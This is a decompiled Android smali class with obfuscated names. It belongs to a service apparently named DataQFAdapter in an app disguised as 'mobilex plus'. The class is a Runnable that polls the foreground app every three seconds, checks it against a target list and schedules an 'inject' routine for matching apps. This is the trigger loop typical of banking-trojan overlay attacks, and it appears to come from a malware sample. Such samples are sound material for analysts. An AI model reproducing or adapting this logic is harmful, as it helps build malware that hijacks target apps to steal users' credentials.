.class public final Lv/s/Anxqm3NelDGirLH5;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;


# direct methods
.method public constructor <init>(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    iput-object p1, p0, Lv/s/Anxqm3NelDGirLH5;->w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 5
    .line 6
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 3

    .line 1
    :try_start_0
    invoke-static {}, Lv/s/oJLsXXGxdTuQpIRpV;->dDIMxZXP1V8HdM()Z

    .line 2
    .line 3
    .line 4
    move-result v0

    .line 5
    if-eqz v0, :cond_0

    .line 6
    .line 7
    sget-object v0, Lv/s/GQh1bKoqkKhujFH2nJ;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 8
    .line 9
    sget-boolean v0, Lv/s/GQh1bKoqkKhujFH2nJ;->JXn4Qf7zpnLjP5:Z

    .line 10
    .line 11
    if-eqz v0, :cond_0

    .line 12
    .line 13
    iget-object v0, p0, Lv/s/Anxqm3NelDGirLH5;->w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 14
    .line 15
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getForegroundPackage(Lapp/mobilex/plus/services/DataQFAdapter;)Ljava/lang/String;

    .line 16
    .line 17
    .line 18
    move-result-object v0

    .line 19
    if-eqz v0, :cond_0

    .line 20
    .line 21
    invoke-static {v0}, Lv/s/GQh1bKoqkKhujFH2nJ;->w9sT1Swbhx3hs(Ljava/lang/String;)Z

    .line 22
    .line 23
    .line 24
    move-result v1

    .line 25
    if-eqz v1, :cond_0

    .line 26
    .line 27
    iget-object v1, p0, Lv/s/Anxqm3NelDGirLH5;->w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 28
    .line 29
    invoke-static {v1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPendingInjectPkg$p(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;)V

    .line 30
    .line 31
    .line 32
    iget-object v0, p0, Lv/s/Anxqm3NelDGirLH5;->w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 33
    .line 34
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getHandler$p(Lapp/mobilex/plus/services/DataQFAdapter;)Landroid/os/Handler;

    .line 35
    .line 36
    .line 37
    move-result-object v0

    .line 38
    iget-object v1, p0, Lv/s/Anxqm3NelDGirLH5;->w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 39
    .line 40
    invoke-static {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInjectRunnable$p(Lapp/mobilex/plus/services/DataQFAdapter;)Ljava/lang/Runnable;

    .line 41
    .line 42
    .line 43
    move-result-object v1

    .line 44
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 45
    .line 46
    .line 47
    iget-object v0, p0, Lv/s/Anxqm3NelDGirLH5;->w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 48
    .line 49
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInjectRunnable$p(Lapp/mobilex/plus/services/DataQFAdapter;)Ljava/lang/Runnable;

    .line 50
    .line 51
    .line 52
    move-result-object v1

    .line 53
    invoke-static {v0, v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$safePost(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/Runnable;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 54
    .line 55
    .line 56
    :catchall_0
    :cond_0
    iget-object v0, p0, Lv/s/Anxqm3NelDGirLH5;->w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 57
    .line 58
    const-wide/16 v1, 0xbb8

    .line 59
    .line 60
    invoke-static {v0, p0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->access$safePostDelayed(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/Runnable;J)V

    .line 61
    .line 62
    .line 63
    return-void
.end method
